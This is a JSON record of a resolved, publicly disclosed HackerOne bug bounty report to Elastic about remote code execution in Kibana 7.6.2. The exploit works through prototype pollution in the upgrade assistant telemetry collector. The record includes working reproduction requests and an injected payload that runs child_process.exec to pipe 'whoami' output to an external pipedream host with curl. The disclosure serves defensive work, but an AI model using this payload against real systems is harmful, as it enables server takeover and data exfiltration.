@@ -1,0 +1,136 @@
+{
+  "id": 852613,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTI2MTM=",
+  "url": "https://hackerone.com/reports/852613",
+  "title": "Remote Code Execution on Cloud via latest Kibana 7.6.2",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-17T22:49:58.303Z",
+  "submitted_at": "2020-04-17T22:49:58.303Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "alexbrasetvik",
+    "url": "/alexbrasetvik",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23607,
+    "url": "https://hackerone.com/elastic",
+    "handle": "elastic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Elastic",
+      "twitter_handle": "elastic",
+      "website": "https://www.elastic.co/",
+      "about": "Smarter search. Stronger security. Seamless observability. Uncover real-time insights with Search AI."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-07-28T19:45:35.016Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-07-28T19:45:34.744Z",
+  "team_member_agreed_on_going_public_at": "2020-07-28T18:22:14.238Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** A prototype pollution in Kibana can be used to gain remote code execution.\n\n**Description:**\n\nThere is a prototype pollution bug in the upgrade assistant's telemetry collector, via a dangerous usage of `_.set`: https://github.com/elastic/kibana/blob/master/x-pack/plugins/upgrade_assistant/server/lib/telemetry/usage_collector.ts#L93\n\nWe can pollute the prototype by providing a specially crafted \"upgrade-assistant-telemetry\" \"saved object\".\n\nThe attached video provides a walkthrough. There is a bit of waiting involved at one point, I included the entire thing for completeness with a hint of when you can fast forward :) \n\n## Steps To Reproduce:\n\nThe following assumes an otherwise empty Kibana. If any steps breaks Kibana, you can `DELETE /.kibana*` and restart it to get going again.\n\n  1. Update the kibana mappings so we can provide our \"upgrade-assistant-telemetry\" document. It's important to provide the full mapping and not just do a dynamic one, or Kibana can refuse to start up due to err-ing when validating mappings\n\n```\nPUT /.kibana_1/_mappings\n{\n  \"properties\": {\n    \"upgrade-assistant-telemetry\": {\n      \"properties\": {\n        \"constructor\": {\n          \"properties\": {\n            \"prototype\": {\n              \"properties\": {\n                \"sourceURL\": {\n                  \"type\": \"text\",\n                  \"fields\": {\n                    \"keyword\": {\n                      \"type\": \"keyword\",\n                      \"ignore_above\": 256\n                    }\n                  }\n                }\n              }\n            }\n          }\n        },\n        \"features\": {\n          \"properties\": {\n            \"deprecation_logging\": {\n              \"properties\": {\n                \"enabled\": {\n                  \"type\": \"boolean\",\n                  \"null_value\": true\n                }\n              }\n            }\n          }\n        },\n        \"ui_open\": {\n          \"properties\": {\n            \"cluster\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"indices\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"overview\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            }\n          }\n        },\n        \"ui_reindex\": {\n          \"properties\": {\n            \"close\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"open\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"start\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"stop\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n  2. With the mapping ready, we can index our own telemetry status doc:\n\n```\nPUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry\n{\n    \"upgrade-assistant-telemetry\" : {\n      \"ui_open.overview\" : 1,\n      \"ui_open.cluster\" : 1,\n      \"ui_open.indices\" : 1,\n      \"constructor.prototype.sourceURL\": \"\\u2028\\u2029\\nglobal.process.mainModule.require('child_process').exec('whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-')\"\n    },\n    \"type\" : \"upgrade-assistant-telemetry\",\n    \"updated_at\" : \"2020-04-17T20:47:40.800Z\"\n  }\n```\n\nThe payload pollutes the prototype, which in turn injects Javascript that spawns a shell process, in this case `whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-`\n\n  3. Wait until collection happens again, or just restart Kibana. In the video I restart Kibana, which you can do via the cloud console. Go to `https://cloud.elastic.co/deployments/[your id]/kibana` and click \"Force Restart\".\n\n  4. Kibana will take about a minute to start. Soon after starting, it'll do a telemetry collection run, that'll cause the above code to be injected and that will run the shell code.\n\nKibana will likely keep starting, run this, crash then restart. I cleaned up my deployment so it's not in a crash-restart loop.\n\n## Impact\n\nAny cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.\n\n## Supporting Material/References:\n\nThe attached video recording walks through the entire attack chain.\n\n## Impact\n\nAny cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.",
+  "bounty_amount": "10000.0",
+  "formatted_bounty": "$10,000",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 793310,
+      "file_name": "Cloud_RCE__Kibana_7.6.2.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mUya5SP9UDtUES23MjMCXQeq?response-content-disposition=attachment%3B%20filename%3D%22Cloud_RCE__Kibana_7.6.2.mp4%22%3B%20filename%2A%3DUTF-8%27%27Cloud_RCE__Kibana_7.6.2.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6INISVZ3%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151846Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJIMEYCIQCxA0kU9XiY%2BIErAIXnMsMVNtl%2FE5gn07DboF84Ro4GewIhAKcH526HP%2FUTlGNE%2Bn3Z%2BKrZG7OBGUuwQgTF7eN2vM4XKrsFCOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igxkq1afLOUwAnpcC78qjwVV7NeQwp6c10oAYyQZlXnTn9gI0Ts%2B9KxIUb4X8GpfDoGqGGXzDUQxkGsQu%2BPGy%2F%2FLIf4JfosEHqORZBSn%2FScHH6f8LzV6C0KHK5jRpzQtoK%2F%2BENjjdQs8haxQiuT2ZRFBcypmd%2BAKTGjMSxe4m1XWFhwDwiIhkY4qm7a2FYMp5nDCtx3KQI%2FBZyn8PShdZTH0P%2By7VBQ%2F7qmQfGzhvWv1dz1CZTBIkOuFKsqQPB6Koah6W78OSIGVKi5bgEbMBingtEmJ67j3Yr992mXh%2BvSXohKdY1Y4gWOHtCfjLzyQE5pPInEBsVtBGV7KCZLUfMqzJ9LJ96B9KpY0ChVQl5mGV5zWxAMtbJ5Vs9gGY3RyPhS7bRETfqgxrAx7fcN6s8RmdT7DYDhWzH%2FP0BjJIdJDI7NR5GJuCWE5Jp9qxnUCt%2B4gv3ZC2QMTB8KLoIlR0q2ZYGEK5v6hdyXfuOuDfEJDL50qQ7qcZN5ziQc%2F5dwCpUhkm9D%2FeZ9j08ZPtOjZcuOqBvbaX7fjVDJtqdjKNG7pSWm0UuWgGiY5D7qRTGWtkavFUSB%2FJvd9qFDSqQXdF8tdsMp8xoBVOF6hhDYRtFbvodyM3sZz%2BswB4ngY6NZrwHECBMmTLsy3YGvQcm3XtOS2xP6hv4egpk347yDEi2PK3l1l7eXzvKJanMacTaMuna2%2BFljYwc%2BLcaUCqFEPfbrjl0X7PPFZQ6sjs3K5sSVE4Z8U%2FHhfR0sV2PLc%2BPJwd6ot9QM98J6UZZqNievrEktulW2VN%2Bng2aPiSqIupgmtEbBMp%2FbECVgwy%2FsQPOL%2FvfvMiWb%2F3SSI55L26VjoVhSSgQC2bm2Rxjv%2BMvwUaqLhX2f28%2Fb6Kz6vgIehCdJzML29%2FM8GOrABGc1isADKJTP2ykuKvj%2BPktq52gWZ9Sl8NQxqpeEdGbEYy8HeJ9qEps%2Fx8nQ%2B0D8zhGH1Ra6nI%2B4jtk8iQWWguah%2B34MJnN2L9sLZd3gkqWmOFGbT1viV3Ej8OnaiPBxI5dC5CzXX17If2zHZSygBHyPXnpGECPPipctHHdSAba6Wkg5J0m9bcPvgIkHBVUReeA%2BlLaf37ZKiYx4iHg2UIdedWVwsHggGaWLH0syaN2w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=428e94fc370b3d6c8aee06c60a46f00618dfef44a30f4782370605a1dfe102b2",
+      "file_size": 42783887,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-08-27T18:22:14.371Z",
+  "allow_singular_disclosure_after": -179787392.08076054,
+  "singular_disclosure_allowed": true,
+  "vote_count": 22,
+  "voters": [
+    "alexbrasetvik",
+    "n1m0",
+    "haxor31337",
+    "dee-see",
+    "iamnoooob",
+    "trieulieuf9",
+    "rzx007x",
+    "shreyaschavhan",
+    "s1r1u5",
+    "dmc3",
+    "and 12 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 4424,
+    "asset_type": "URL",
+    "asset_identifier": "cloud.elastic.co",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
